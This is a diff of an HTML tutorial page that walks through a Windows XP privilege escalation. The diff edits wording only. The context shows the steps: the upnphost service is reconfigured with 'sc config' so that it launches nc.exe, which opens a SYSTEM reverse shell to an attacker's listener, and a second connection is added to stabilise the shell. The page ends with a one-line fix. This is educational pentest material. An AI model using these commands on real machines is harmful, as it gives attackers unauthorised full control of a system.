@@ -124,7 +124,7 @@ ftp> binary
 							</code>
 							<br />
                             <p>PROBLEM:</p>
-							 <p>When accesschk.exe is uploaded and we execute the latest version of accesschk.exe from SysInternals, we won't be able to execute this in our low level shell. Why you ask? Well, when you run accesschk.exe for the first time in a GUI environment, it will give you a pop up window asking you to accept their EULA. If we run accesschk.exe via CLI it would freeze our shell. Wouldn't they build in some kind of parameter in the accesschk.exe binary to accept the EULA via CLI? Yes, they actually did. In older versions of accesschk.exe there was a parameter /accepteula which did exactly that, but they removed in the newer releases. That being said, we will have to download an older version of accesschk.exe to fulfill our needs.</p>
+							 <p>When accesschk.exe is uploaded and we execute the latest version of accesschk.exe from SysInternals, we won't be able to execute this in our low level shell. Why you ask? Well, when you run accesschk.exe for the first time in a GUI environment, it will give you a pop up window asking you to accept their EULA. If we run accesschk.exe via CLI it would freeze our shell. Wouldn't they build in some kind of parameter in the accesschk.exe binary to accept the EULA via CLI? Yes, they actually did. In older versions of accesschk.exe there was a parameter /accepteula which did exactly that, but they removed the parameter in newer releases. That being said, we will have to download an older version of accesschk.exe to fulfill our needs.</p>
 							 <p>You can download older versions with the /accepteula parameter from <a href="https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%0D">here</a> and <a href="https://xor.cat/assets/other/Accesschk.zip">here</a>.</p>
 							 <p>With that issue out of the way, let's continue. Once you have uploaded the older version of accesschk.exe to your victim, we can use it to look for vulnerable services we can exploit. We can do this with the following query:</p>
 							 <code>
@@ -210,7 +210,7 @@ SERVICE_NAME: SSDPSRV
         SERVICE_START_NAME : NT AUTHORITY\LocalService								 
 							 </code>
 							 </br>
-							 <p>upnphost is the service we are going to inject. As you can see upnphost has a dependency, it requires SSDPSRV to run aswel. If we take a look at the current status of SSDPSRV with the command <span style="color:yellow;">sc query SSDPSRV</span> we can see that the service is currently STOPPED. If we try to start this service, we will get an error, as shown below.</p>
+							 <p>upnphost is the service we are going to use to escalate our privileges. As you can see upnphost has a dependency, it requires SSDPSRV to run aswel. If we take a look at the current status of SSDPSRV with the command <span style="color:yellow;">sc query SSDPSRV</span> we can see that the service is currently STOPPED. If we try to start this service, we will get an error, as shown below.</p>
 							<code>
 # Query status
 								
@@ -265,12 +265,12 @@ The SSDP Discovery Service service is starting.
 The SSDP Discovery Service service was started successfully.							
 							</code>
 							<br />
-							<p>Awesome! We now have our dependency running to start the upnphost service. If we run upnphost now though, it won't do much good for us. We first need to edit its parameters so the service will execute a binary of our choice. There are multiple ways to approach this. One option is to generate our own binary with msfvenom, but that's out of scope for this article. What we will do is upload the netcat binary (nc.exe) to our victim. Again, don't forget to put your FTP session is binary, or you won't be able to execute the executable via CLI.</p>
+							<p>Awesome! We now have our dependency running to start the upnphost service. If we run upnphost now though, it won't do much good for us. We first need to edit its parameters so the service will execute a binary of our choice. There are multiple ways to approach this. One option is to generate our own binary with msfvenom, but that's out of scope for this article. What we will do is upload the netcat binary (nc.exe) to our victim. Again, don't forget to put your FTP session in binary, or you won't be able to execute the executable via CLI.</p>
 							<p>You can download the Windows executables (32bit and 64bit) from Netcat <a href="https://eternallybored.org/misc/netcat/">here</a>.</p>
-							<p>Once nc.exe is uploaded to your victim, take note of it's current path, because we will need it now we are going to edit the parameters from the upnphost service. Execute the commands below to edit the path of the binary that the upnphost service will execute when it's started.</p>
+							<p>Once nc.exe is uploaded to your victim, take note of its current path, because we will need it now we are going to edit the parameters from the upnphost service. Execute the commands below to edit the path of the binary that the upnphost service will execute when it's started.</p>
 							<code>
 # Set new binary path (don't forget the space after binpath=)							
-# Syntax<br>
+# Syntax
 								
 C:\> sc config upnphost binpath= "C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe"
 
@@ -283,7 +283,7 @@ C:\> sc config upnphost obj= ".\LocalSystem" password= ""
 [SC] ChangeServiceConfig SUCCESS							
 							</code>
 							<br />
-							<p>Our upnphost service should now be ready to execute our nc.exe binary and connect back to a listener we will set up on our attacking machine. Let's so one last check of our upnphost service and make sure everything is as it should be.</p>
+							<p>Our upnphost service should now be ready to execute our nc.exe binary and connect back to a listener we will set up on our attacking machine. Let's do one last check of our upnphost service and make sure everything is as it should be.</p>
 							<code>
 C:\> sc qc upnphost
 [SC] GetServiceConfig SUCCESS
@@ -310,7 +310,7 @@ root@pwnux:~# nc -lvnp 4444
 C:\> net start upnphost							
 							</code>
 							<br />
-							<p>We have now received a SYSTEM shell on our listener at our attacking machine! But there's another problem. The shell is unstable and it closes after about 30 seconds. Luckily there is a way to solve this. Once we get the unstable shell on port 4444, we will execute another command right away that will establish a 2nd connection to another listener we set up on another port. When the shell is closed, set up your listener again at port 4444 and set up a 2nd listener in another tab on another port. I will set my 2nd listener at port 4445.</p>
+							<p>We have now received a SYSTEM shell on our listener at our attacking machine! But there's another problem. The shell is unstable and it closes after about 30 seconds. Luckily there is a way to solve this. Once we get the unstable shell on port 4444, we will execute another command right away that will establish a 2nd connection to another listener we set up on another port. When the unstable shell is closed, set up your listener again at port 4444 and set up a 2nd listener in another tab on another port. I will set my 2nd listener at port 4445.</p>
 							<code>
 # TAB 1
 root@pwnux:~# nc -lvnp 4444
@@ -324,7 +324,7 @@ root@pwnux:~# nc -lvnp 4445
 C:\nc.exe -nv 192.168.0.2 4445 -e C:\WINDOWS\System32\cmd.exe							
 							</code>
 							<br />
-							<p>Finally we're ready to get a steady SYSTEM shell. Start the upnphost service again, a new connection will be established to our listener on port 4444. Once this shell is open, paste your payload we just created for a new connection to our listener on port 4445 and execute it. When we now check our listener in TAB 2, we will have a steady SYSTEM shell that will not close after about 30 seconds.</p>
+							<p>Finally we're ready to get a steady SYSTEM shell. Start the upnphost service again, a new connection will be established to our listener on port 4444. Once this shell is open, paste your payload we just created for a new connection to our listener on port 4445 and execute it. When we now check our listener in TAB 2, we will have a steady SYSTEM shell that will not close after a while.</p>
                             <li><h5>How to protect against this exploit</h5></li>
 							<p>Upgrade to Windows XP SP2 or higher.</p>
                           
